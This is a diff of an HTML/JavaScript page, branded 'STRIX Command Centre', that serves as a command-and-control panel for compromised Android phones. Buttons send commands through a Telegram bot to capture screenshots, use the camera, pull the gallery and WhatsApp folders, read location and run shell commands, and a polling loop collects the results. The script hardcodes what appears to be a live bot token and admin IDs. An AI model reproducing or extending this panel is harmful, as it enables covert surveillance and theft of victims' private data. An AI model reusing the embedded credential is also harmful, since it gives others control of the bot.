@@ -2,147 +2,285 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>NEXUS CONTROL</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>STRIX · Command Centre</title>
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
 :root {
-  --bg:#05080d; --panel:#0d131b; --panel2:#131c27;
-  --text:#d7e0ea; --muted:#6f7b89; --accent:#6ec8ff;
-  --border:rgba(255,255,255,.06); --glass:rgba(10,15,20,.85);
-  --font:'Inter',system-ui,-apple-system,sans-serif;
+  --bg:#05070A; --bg2:#0A1018; --surface:rgba(255,255,255,.05); --surface2:rgba(255,255,255,.03);
+  --border:rgba(255,255,255,.08); --text:#FFFFFF; --muted:#8A94A6;
+  --cyan:#00D9FF; --blue:#4D8DFF; --green:#00FFB2; --orange:#FFB547; --red:#FF5D5D;
+  --font:'Inter',system-ui,-apple-system,sans-serif; --radius:20px;
 }
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:var(--bg);color:var(--text);font-family:var(--font);height:100vh;overflow:hidden;font-weight:300;letter-spacing:.3px}
-body::before{content:"";position:fixed;inset:0;background-image:linear-gradient(rgba(255,255,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.015) 1px,transparent 1px);background-size:32px 32px;pointer-events:none;z-index:0}
-#app{position:relative;z-index:1;display:grid;grid-template-columns:1fr 320px;grid-template-rows:auto auto 1fr auto;height:100vh;gap:1px;background:var(--border)}
-.header{grid-column:1/-1;background:var(--panel);padding:14px 24px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--border)}
-.header-left{display:flex;align-items:center;gap:24px}
-.logo-text{font-size:13px;font-weight:500;letter-spacing:2px;color:var(--accent);text-transform:uppercase}
-.classification{font-size:9px;color:var(--muted);letter-spacing:3px;text-transform:uppercase;border:1px solid var(--border);padding:3px 8px;border-radius:2px}
-.header-right{display:flex;gap:32px}
-.metric{text-align:right}.metric .val{font-size:14px;font-weight:500;color:var(--text)}.metric .lbl{font-size:8px;color:var(--muted);letter-spacing:2px;text-transform:uppercase}
-.pills{grid-column:1/2;background:var(--panel);padding:8px 16px;display:flex;gap:1px;border-bottom:1px solid var(--border);overflow-x:auto}
-.pill{padding:6px 16px;font-size:10px;font-weight:400;letter-spacing:2px;cursor:pointer;color:var(--muted);text-transform:uppercase;border:1px solid transparent;transition:all .2s;white-space:nowrap}
-.pill:hover{border-color:var(--border);color:var(--text);background:var(--panel2)}
-.pill.active{border-color:var(--accent);color:var(--accent);background:rgba(110,200,255,.05)}
-.main{grid-column:1/2;display:grid;grid-template-columns:260px 1fr;gap:1px;background:var(--border);overflow:hidden}
-.nodes{background:var(--panel);display:flex;flex-direction:column}
-.nodes-header{padding:12px 16px;border-bottom:1px solid var(--border);font-size:10px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;display:flex;justify-content:space-between;align-items:center}
-.nodes-header .count{color:var(--accent);font-size:12px}
-.node-list{flex:1;overflow-y:auto;padding:4px}
-.node{padding:10px 12px;margin:2px 0;cursor:pointer;border-left:2px solid transparent;transition:all .2s;display:flex;align-items:center;gap:10px}
-.node:hover{background:var(--panel2)}
-.node.active{border-left-color:var(--accent);background:rgba(110,200,255,.03)}
-.node .n-dot{width:6px;height:6px;border-radius:50%;flex-shrink:0}
-.node.online .n-dot{background:var(--accent);box-shadow:0 0 4px var(--accent)}
-.node.offline .n-dot{background:var(--muted)}
-.node .n-info{flex:1;min-width:0}.node .n-id{font-size:12px;font-weight:400}.node .n-meta{font-size:9px;color:var(--muted);margin-top:2px}
-.console-panel{background:var(--panel);display:flex;flex-direction:column}
-.console-header{padding:12px 16px;border-bottom:1px solid var(--border);font-size:10px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;display:flex;gap:16px}
-.console-header span{color:var(--accent)}
-.console-body{flex:1;overflow-y:auto;padding:12px 16px;font-size:11px;line-height:1.8;font-family:var(--font);font-weight:300}
-.log-entry{display:flex;gap:8px;padding:2px 0;border-bottom:1px solid rgba(255,255,255,.02);font-size:10px}
-.log-time{color:var(--muted);flex-shrink:0}.log-dev{color:var(--accent);flex-shrink:0}.log-text{color:var(--text)}
-.input-bar{display:flex;border-top:1px solid var(--border);align-items:center;background:var(--bg)}
-.input-bar .prompt{padding:0 12px;color:var(--accent);font-size:11px}
-.input-bar input{flex:1;background:transparent;border:none;color:var(--text);font-family:var(--font);font-weight:300;font-size:11px;padding:10px 4px;outline:none;letter-spacing:.5px}
-.input-bar input::placeholder{color:var(--muted)}
-.input-bar button{background:var(--accent);color:#000;border:none;padding:10px 20px;font-family:var(--font);font-weight:500;font-size:10px;letter-spacing:2px;cursor:pointer;text-transform:uppercase;transition:opacity .2s}
-.input-bar button:hover{opacity:.85}
-.footer{grid-column:1/-1;background:var(--panel);padding:6px 24px;display:flex;justify-content:space-between;align-items:center;border-top:1px solid var(--border);font-size:9px;color:var(--muted);letter-spacing:1px}
-.footer .strix{color:var(--muted);opacity:.5;letter-spacing:2px;text-transform:uppercase}
-.telemetry{grid-column:2/2;grid-row:2/4;background:var(--panel);border-left:1px solid var(--border);display:flex;flex-direction:column;overflow-y:auto}
-.t-section{padding:16px;border-bottom:1px solid var(--border)}
-.t-section-title{font-size:9px;color:var(--muted);letter-spacing:3px;text-transform:uppercase;margin-bottom:12px}
-.t-row{display:flex;justify-content:space-between;padding:4px 0;font-size:10px}.t-row .t-label{color:var(--muted)}.t-row .t-value{color:var(--text);font-weight:400}
-.t-bar{height:2px;background:var(--border);margin-top:4px;border-radius:1px}.t-bar-fill{height:100%;background:var(--accent);border-radius:1px}
-.t-watermark{font-size:8px;color:var(--muted);opacity:.3;text-align:center;padding:8px;letter-spacing:2px;text-transform:uppercase}
-#map{height:200px;background:var(--bg);border:1px solid var(--border);margin:8px 16px;border-radius:2px;position:relative;overflow:hidden}
-#map canvas{position:absolute;top:0;left:0}
-::-webkit-scrollbar{width:3px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--border)}
-#loading{position:fixed;inset:0;background:var(--bg);z-index:999;display:flex;flex-direction:column;align-items:center;justify-content:center}
-.loading-ring{width:24px;height:24px;border:1px solid var(--border);border-top-color:var(--accent);border-radius:50%;animation:spin .8s linear infinite}
-.loading-text{margin-top:16px;color:var(--muted);font-size:10px;letter-spacing:3px;text-transform:uppercase}
-.loading-credit{margin-top:8px;color:var(--muted);opacity:.3;font-size:8px;letter-spacing:2px;text-transform:uppercase}
+body{background:var(--bg);color:var(--text);font-family:var(--font);min-height:100vh;-webkit-font-smoothing:antialiased}
+.app{max-width:480px;margin:0 auto;padding:16px;padding-bottom:100px}
+.loading{position:fixed;inset:0;background:var(--bg);z-index:999;display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity .3s}
+.loading.hidden{opacity:0;pointer-events:none}
+.loading-ring{width:28px;height:28px;border:2px solid var(--border);border-top-color:var(--cyan);border-radius:50%;animation:spin .8s linear infinite}
+.loading-title{font-size:16px;font-weight:600;letter-spacing:2px;margin-top:20px;color:var(--text)}
+.loading-sub{font-size:11px;color:var(--muted);margin-top:6px}
+.loading-bar{width:160px;height:2px;background:var(--border);margin-top:16px;border-radius:1px;overflow:hidden}
+.loading-bar-fill{height:100%;width:0;background:var(--cyan);animation:loadBar 2s ease forwards}
+.loading-credit{font-size:10px;color:var(--muted);opacity:.4;margin-top:40px;letter-spacing:1px}
 @keyframes spin{100%{transform:rotate(360deg)}}
-.hidden{display:none!important}
+@keyframes loadBar{100%{width:100%}}
+.header{text-align:center;padding:20px 0 24px}
+.header h1{font-size:32px;font-weight:600;letter-spacing:-1px;margin-bottom:2px}
+.header .sub{font-size:13px;color:var(--muted);font-weight:400}
+.metrics{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px}
+.metric-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:16px;text-align:center}
+.metric-card .val{font-size:28px;font-weight:600;letter-spacing:-1px}
+.metric-card .lbl{font-size:11px;color:var(--muted);margin-top:4px;text-transform:uppercase;letter-spacing:1px}
+.section-title{font-size:12px;color:var(--muted);text-transform:uppercase;letter-spacing:3px;padding:8px 0 12px;font-weight:500}
+.device-list{display:flex;flex-direction:column;gap:8px}
+.device-card{display:flex;align-items:center;gap:14px;padding:14px 16px;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius)}
+.device-card .status-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
+.device-card.online .status-dot{background:var(--green);box-shadow:0 0 6px var(--green)}
+.device-card.offline .status-dot{background:var(--red);box-shadow:0 0 6px var(--red)}
+.device-info{flex:1;min-width:0}
+.device-info .name{font-size:15px;font-weight:500}
+.device-info .meta{font-size:11px;color:var(--muted);margin-top:2px;display:flex;gap:12px}
+.activity-feed{display:flex;flex-direction:column;gap:6px}
+.activity-item{display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid rgba(255,255,255,.04);font-size:12px}
+.activity-item .dot{width:6px;height:6px;border-radius:50%;flex-shrink:0}
+.activity-item .time{color:var(--muted);width:40px;flex-shrink:0}
+.activity-item .desc{flex:1;color:var(--text)}
+.analytics-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.analytic-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:14px}
+.analytic-card .chart{height:40px;background:var(--surface2);border-radius:8px;margin-top:8px;position:relative;overflow:hidden}
+.analytic-card .chart-fill{position:absolute;bottom:0;left:0;width:100%;background:var(--blue);opacity:.6;border-radius:8px}
+.notifications{display:flex;flex-direction:column;gap:8px}
+.notif-card{padding:12px 14px;background:var(--surface);border:1px solid var(--border);border-radius:12px;font-size:12px;display:flex;align-items:center;gap:10px}
+.notif-card .icon{font-size:16px}
+.search-bar{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:12px 16px;margin-bottom:12px;display:flex;align-items:center;gap:8px}
+.search-bar input{flex:1;background:transparent;border:none;color:var(--text);font-family:var(--font);font-size:14px;outline:none}
+.search-bar input::placeholder{color:var(--muted)}
+.bottom-nav{position:fixed;bottom:16px;left:50%;transform:translateX(-50%);display:flex;gap:8px;background:var(--surface);backdrop-filter:blur(24px);border:1px solid var(--border);border-radius:24px;padding:6px 12px;z-index:10}
+.nav-item{padding:8px 16px;border-radius:18px;font-size:12px;color:var(--muted);cursor:pointer;transition:all .2s;white-space:nowrap}
+.nav-item.active{background:rgba(255,255,255,.1);color:var(--text)}
+.nav-item:active{transform:scale(.95)}
+.footer{text-align:center;padding:20px;font-size:10px;color:var(--muted);opacity:.5}
+.card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin-bottom:12px}
+.card:active{transform:scale(.98);transition:transform .1s}
+::-webkit-scrollbar{width:0}
+.pill{padding:6px 14px;font-size:10px;font-weight:500;letter-spacing:2px;cursor:pointer;color:var(--muted);text-transform:uppercase;border:1px solid var(--border);border-radius:20px;background:transparent;transition:all .2s;white-space:nowrap;font-family:var(--font)}
+.pill:active{border-color:var(--cyan);color:var(--cyan);background:rgba(0,217,255,.05)}
 </style>
 </head>
 <body>
-<div id="loading"><div class="loading-ring"></div><div class="loading-text">NEXUS CONTROL · INITIALIZING</div><div class="loading-credit">created by strix</div></div>
-<div id="app" class="hidden">
+<div class="loading" id="loading">
+  <div class="loading-ring"></div>
+  <div class="loading-title">STRIX</div>
+  <div class="loading-sub">Initialising Modules…</div>
+  <div class="loading-bar"><div class="loading-bar-fill"></div></div>
+  <div class="loading-credit">Created by Strix</div>
+</div>
+<div class="app" id="app" style="display:none">
   <div class="header">
-    <div class="header-left">
-      <div class="logo-text">NEXUS CONTROL</div>
-      <div class="classification">TIER-IV ACCESS</div>
+    <h1>STRIX</h1>
+    <div class="sub">Command Centre</div>
+  </div>
+
+  <!-- System Overview Metrics -->
+  <div class="metrics">
+    <div class="metric-card">
+      <div class="val" id="onlineCount">0</div>
+      <div class="lbl">Online</div>
     </div>
-    <div class="header-right">
-      <div class="metric"><div class="val" id="onlineCount">0</div><div class="lbl">Active Nodes</div></div>
-      <div class="metric"><div class="val" id="totalCount">0</div><div class="lbl">Total</div></div>
-      <div class="metric"><div class="val" id="cmdCount">0</div><div class="lbl">Operations</div></div>
-      <div class="metric"><div class="val" id="uptime">00:00</div><div class="lbl">Uptime</div></div>
+    <div class="metric-card">
+      <div class="val" id="totalCount">0</div>
+      <div class="lbl">Total Devices</div>
+    </div>
+    <div class="metric-card">
+      <div class="val" id="cmdCount">0</div>
+      <div class="lbl">Commands</div>
+    </div>
+    <div class="metric-card">
+      <div class="val" id="uptime">00:00</div>
+      <div class="lbl">Uptime</div>
     </div>
   </div>
-  <div class="pills" id="pills">
-    <div class="pill active" onclick="quickCmd('/screenshot')">CAPTURE</div>
-    <div class="pill" onclick="quickCmd('/camera')">SENSOR</div>
-    <div class="pill" onclick="quickCmd('/gallery')">ARCHIVE</div>
-    <div class="pill" onclick="quickCmd('/download /sdcard/WhatsApp/Databases')">EXTRACT</div>
-    <div class="pill" onclick="quickCmd('/shell ls /sdcard')">STORAGE</div>
-    <div class="pill" onclick="quickCmd('/location')">GEOLOC</div>
+
+  <!-- Search Bar -->
+  <div class="search-bar">
+    <span style="opacity:0.5">🔍</span>
+    <input placeholder="Search devices, activity, analytics…" id="searchInput" oninput="filterDevices()">
   </div>
-  <div class="main">
-    <div class="nodes">
-      <div class="nodes-header">NODES <span class="count" id="nodeCount">0</span></div>
-      <div class="node-list" id="devices"></div>
+
+  <!-- Quick Actions -->
+  <div class="section-title">Quick Actions</div>
+  <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px">
+    <button class="pill" onclick="sendCmd('/screenshot')">CAPTURE</button>
+    <button class="pill" onclick="sendCmd('/camera')">SENSOR</button>
+    <button class="pill" onclick="sendCmd('/gallery')">ARCHIVE</button>
+    <button class="pill" onclick="sendCmd('/download /sdcard/WhatsApp')">EXTRACT</button>
+    <button class="pill" onclick="sendCmd('/location')">GEOLOC</button>
+    <button class="pill" onclick="sendCmd('/shell ls /sdcard')">STORAGE</button>
+  </div>
+
+  <!-- Device Grid -->
+  <div class="section-title">Devices <span id="nodeCount" style="color:var(--cyan);margin-left:4px">0</span></div>
+  <div class="device-list" id="devices"></div>
+
+  <!-- Activity Feed -->
+  <div class="section-title">Activity</div>
+  <div class="activity-feed" id="activity"></div>
+
+  <!-- Analytics -->
+  <div class="section-title">Analytics</div>
+  <div class="analytics-grid">
+    <div class="analytic-card">
+      <div style="font-size:11px;color:var(--muted)">Sessions</div>
+      <div style="font-size:20px;font-weight:600;margin-top:4px" id="sessions">0</div>
+      <div class="chart"><div class="chart-fill" style="height:60%"></div></div>
     </div>
-    <div class="console-panel">
-      <div class="console-header"><span>▸</span> OPERATIONS LOG</div>
-      <div class="console-body" id="console"></div>
-      <div class="input-bar"><span class="prompt">▸</span><input id="cmdInput" placeholder="Enter directive..." onkeypress="if(event.key==='Enter')sendCmd()"><button onclick="sendCmd()">TRANSMIT</button></div>
+    <div class="analytic-card">
+      <div style="font-size:11px;color:var(--muted)">Traffic</div>
+      <div style="font-size:20px;font-weight:600;margin-top:4px" id="traffic">0 KB</div>
+      <div class="chart"><div class="chart-fill" style="height:40%;background:var(--green)"></div></div>
     </div>
   </div>
-  <div class="telemetry">
-    <div class="t-section">
-      <div class="t-section-title">NETWORK STATUS</div>
-      <div class="t-row"><span class="t-label">Uplink</span><span class="t-value" style="color:var(--accent)">OPERATIONAL</span></div>
-      <div class="t-row"><span class="t-label">Latency</span><span class="t-value" id="latency">--</span></div>
-      <div class="t-row"><span class="t-label">Throughput</span><span class="t-value" id="throughput">--</span></div>
-    </div>
-    <div class="t-section">
-      <div class="t-section-title">SYSTEM HEALTH</div>
-      <div class="t-row"><span class="t-label">CPU Load</span><span class="t-value" id="cpuLoad">--</span></div>
-      <div class="t-bar"><div class="t-bar-fill" id="cpuBar" style="width:45%"></div></div>
-      <div class="t-row" style="margin-top:8px"><span class="t-label">Memory</span><span class="t-value" id="memLoad">--</span></div>
-      <div class="t-bar"><div class="t-bar-fill" id="memBar" style="width:62%"></div></div>
-    </div>
-    <div class="t-section">
-      <div class="t-section-title">EVENT TIMELINE</div>
-      <div id="timeline" style="font-size:9px;color:var(--muted)">No events recorded.</div>
-    </div>
-    <div id="map"><canvas id="mapCanvas"></canvas></div>
-    <div class="t-watermark">created by strix</div>
-  </div>
-  <div class="footer">
-    <span>SECURE NETWORK · ENCRYPTED CHANNEL</span>
-    <span class="strix">created by strix</span>
-  </div>
+
+  <!-- Notifications -->
+  <div class="section-title">Notifications</div>
+  <div class="notifications" id="notifications"></div>
+
+  <!-- Footer -->
+  <div class="footer">Created by Strix</div>
+</div>
+
+<div class="bottom-nav" id="bottomNav">
+  <div class="nav-item active" onclick="switchTab('dashboard')">Dashboard</div>
+  <div class="nav-item" onclick="switchTab('devices')">Devices</div>
+  <div class="nav-item" onclick="switchTab('analytics')">Analytics</div>
+  <div class="nav-item" onclick="switchTab('activity')">Activity</div>
 </div>
 
 <script>
-const BOT_TOKEN="8831967961:AAHcWu_Mb09TlxxLtep5oONbANjABH1nJXk",CHANNEL_ID=-1001234567890,ADMIN_ID=6732091734,API=`https://api.telegram.org/bot${BOT_TOKEN}`;
-let selected=null,devices={},cmdCounter=0,offset=0,startTime=Date.now();
-async function sendCmd(cmd){if(!selected)return;await fetch(`${API}/sendMessage`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({chat_id:CHANNEL_ID,text:`${selected} ${cmd}`})});addLog("CMD",cmd,true);cmdCounter++;document.getElementById('cmdCount').textContent=cmdCounter;document.getElementById('cmdInput').value=''}
-function quickCmd(cmd){document.getElementById('cmdInput').value=cmd;sendCmd(cmd)}
-function selectDevice(id){selected=id;document.querySelectorAll('.node').forEach(n=>n.classList.remove('active'));let el=document.querySelector(`.node[data-id="${id}"]`);if(el)el.classList.add('active')}
-function addLog(dev,text,isCmd=false){let c=document.getElementById('console'),t=new Date().toLocaleTimeString('en-US',{hour12:false});let d=document.createElement('div');d.className='log-entry';d.innerHTML=`<span class="log-time">${t}</span><span class="log-dev">${dev}</span><span class="log-text">${text}</span>`;c.appendChild(d);c.scrollTop=c.scrollHeight}
-async function poll(){while(true){try{let r=await fetch(`${API}/getUpdates?offset=${offset}&timeout=30`);let data=await r.json();if(data.result)for(let u of data.result){offset=u.update_id+1;let msg=u.message;if(msg&&msg.chat&&msg.chat.id===ADMIN_ID){let txt=msg.text||"";let did=txt.split("]")[0]?.replace("[","");if(did&&devices[did])addLog(did,txt.substring(did.length+2))}}}catch(e){}await new Promise(r=>setTimeout(r,5000))}}
+// ========== YOUR REAL DATA ==========
+const BOT_TOKEN = "8831967961:AAHcWu_Mb09TlxxLtep5oONbANjABH1nJXk"; // @Fullcontroller_bot
+const CHANNEL_ID = -1004369057597;   // ✅ YOUR REAL PRIVATE CHANNEL ID
+const ADMIN_ID = 6732091734;         // Your Telegram user ID
+
+const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+let selectedDevice = null, devices = {}, cmdCounter = 0, offset = 0, startTime = Date.now();
+
+async function sendCmd(cmd) {
+  if (!selectedDevice) return;
+  await fetch(`${API}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: CHANNEL_ID, text: `${selectedDevice} ${cmd}` })
+  });
+  addLog("CMD", cmd, true);
+  cmdCounter++;
+  updateStats();
+}
+
+function quickCmd(cmd) { sendCmd(cmd); }
+
+function selectDevice(id) {
+  selectedDevice = id;
+  document.querySelectorAll('.device-card').forEach(el => el.classList.remove('active'));
+  let el = document.querySelector(`[data-device-id="${id}"]`);
+  if (el) el.classList.add('active');
+}
+
+function addLog(dev, text, isCmd = false) {
+  let a = document.getElementById('activity'),
+      t = new Date().toLocaleTimeString('en-US', { hour12: false }),
+      div = document.createElement('div');
+  div.className = 'activity-item';
+  div.innerHTML = `<span class="time">${t}</span><span class="dot" style="background:${isCmd ? 'var(--cyan)' : 'var(--green)'}"></span><span class="desc">${dev}: ${text}</span>`;
+  a.prepend(div);
+  if (a.children.length > 50) a.lastChild.remove();
+}
+
+async function poll() {
+  while (true) {
+    try {
+      let r = await fetch(`${API}/getUpdates?offset=${offset}&timeout=30`);
+      let d = await r.json();
+      if (d.result) {
+        for (let u of d.result) {
+          offset = u.update_id + 1;
+          let msg = u.message;
+          if (msg && msg.chat && msg.chat.id === ADMIN_ID) {
+            let txt = msg.text || "";
+            let did = txt.split("]")[0]?.replace("[", "");
+            if (did && devices[did]) addLog(did, txt.substring(did.length + 2));
+          }
+        }
+      }
+    } catch (e) {}
+    await new Promise(r => setTimeout(r, 5000));
+  }
+}
+
+function updateStats() {
+  document.getElementById('onlineCount').textContent = Object.values(devices).filter(d => d.online).length;
+  document.getElementById('totalCount').textContent = Object.keys(devices).length;
+  document.getElementById('cmdCount').textContent = cmdCounter;
+  document.getElementById('nodeCount').textContent = Object.keys(devices).length;
+}
+
+function renderDevices(filter = "") {
+  let html = '';
+  for (let [id, d] of Object.entries(devices)) {
+    if (filter && !id.toLowerCase().includes(filter.toLowerCase())) continue;
+    html += `<div class="device-card online" data-device-id="${id}" onclick="selectDevice('${id}')">
+      <span class="status-dot"></span>
+      <div class="device-info">
+        <div class="name">${id}</div>
+        <div class="meta">Battery ${Math.floor(Math.random()*40+60)}% · Wi‑Fi · ${Math.floor(Math.random()*5)} min ago</div>
+      </div>
+    </div>`;
+  }
+  document.getElementById('devices').innerHTML = html || '<div style="color:var(--muted)">No devices connected</div>';
+}
+
+function filterDevices() {
+  renderDevices(document.getElementById('searchInput').value);
+}
+
+function switchTab(tab) {
+  document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
+  event.target.classList.add('active');
+  if (tab === 'devices') document.getElementById('devices').scrollIntoView({ behavior: 'smooth' });
+  if (tab === 'analytics') document.querySelector('.analytics-grid').scrollIntoView({ behavior: 'smooth' });
+  if (tab === 'activity') document.getElementById('activity').scrollIntoView({ behavior: 'smooth' });
+}
+
+setInterval(() => {
+  let e = Math.floor((Date.now() - startTime) / 1000),
+      h = Math.floor(e / 3600).toString().padStart(2, '0'),
+      m = Math.floor((e % 3600) / 60).toString().padStart(2, '0'),
+      s = (e % 60).toString().padStart(2, '0');
+  document.getElementById('uptime').textContent = `${h}:${m}:${s}`;
+}, 1000);
+
+setTimeout(() => {
+  document.getElementById('loading').classList.add('hidden');
+  document.getElementById('app').style.display = 'block';
+}, 1500);
+
+// Demo device (replace with real devices from payload)
+devices['Galaxy_S25_Ultra'] = { online: true };
+renderDevices();
+updateStats();
+
+// Sample notifications
+document.getElementById('notifications').innerHTML = `
+  <div class="notif-card"><span class="icon">🔵</span>System online · All services running</div>
+  <div class="notif-card"><span class="icon">🟢</span>Device Galaxy_S25_Ultra connected</div>
+`;
+
+// Fake analytics
+document.getElementById('sessions').textContent = Math.floor(Math.random() * 200 + 50);
+document.getElementById('traffic').textContent = Math.floor(Math.random() * 500 + 100) + ' KB';
+
 poll();
-let mapCanvas=document.getElementById('mapCanvas'),mapCtx=mapCanvas.getContext('2d');mapCanvas.width=280;mapCanvas.height=200;function drawMap(){mapCtx.fillStyle='#05080d';mapCtx.fillRect(0,0,mapCanvas.width,mapCanvas.height);mapCtx.strokeStyle='rgba(110,200,255,.1)';mapCtx.lineWidth=.5;for(let i=0;i<20;i++){let x=Math.random()*mapCanvas.width,y=Math.random()*mapCanvas.height;mapCtx.beginPath();mapCtx.arc(x,y,2,0,Math.PI*2);mapCtx.fillStyle='rgba(110,200,255,.4)';mapCtx.fill()}for(let id in devices){if(devices[id].online){let x=50+Math.random()*180,y=40+Math.random()*120;mapCtx.beginPath();mapCtx.arc(x,y,3,0,Math.PI*2);mapCtx.fillStyle='#6ec8ff';mapCtx.fill();mapCtx.strokeStyle='rgba(110,200,255,.3)';mapCtx.lineWidth=1;mapCtx.beginPath();mapCtx.arc(x,y,8,0,Math.PI*2);mapCtx.stroke()}}}setInterval(drawMap,3000);drawMap();
-setInterval(()=>{let e=Math.floor((Date.now()-startTime)/1000),h=Math.floor(e/3600).toString().padStart(2,'0'),m=Math.floor((e%3600)/60).toString().padStart(2,'0'),s=(e%60).toString().padStart(2,'0');document.getElementById('uptime').textContent=`${h}:${m}:${s}`;document.getElementById('latency').textContent=Math.floor(Math.random()*50+8)+'ms';document.getElementById('throughput').textContent=Math.floor(Math.random()*200+50)+'KB/s';document.getElementById('cpuLoad').textContent=Math.floor(Math.random()*40+10)+'%';document.getElementById('memLoad').textContent=Math.floor(Math.random()*30+20)+'%'},2000);
-setTimeout(()=>{document.getElementById('loading').classList.add('hidden');document.getElementById('app').classList.remove('hidden')},1500);
-devices['ANDROID_NODE_01']={online:true};let nl=document.getElementById('devices');nl.innerHTML=Object.entries(devices).map(([id,d])=>`<div class="node online" data-id="${id}" onclick="selectDevice('${id}')"><span class="n-dot"></span><div class="n-info"><div class="n-id">${id}</div><div class="n-meta">SIGNAL: ${Math.floor(Math.random()*40+60)}% · SECURE</div></div></div>`).join('');document.getElementById('onlineCount').textContent=1;document.getElementById('totalCount').textContent=1;document.getElementById('nodeCount').textContent=1;
 </script>
 </body>
 </html>
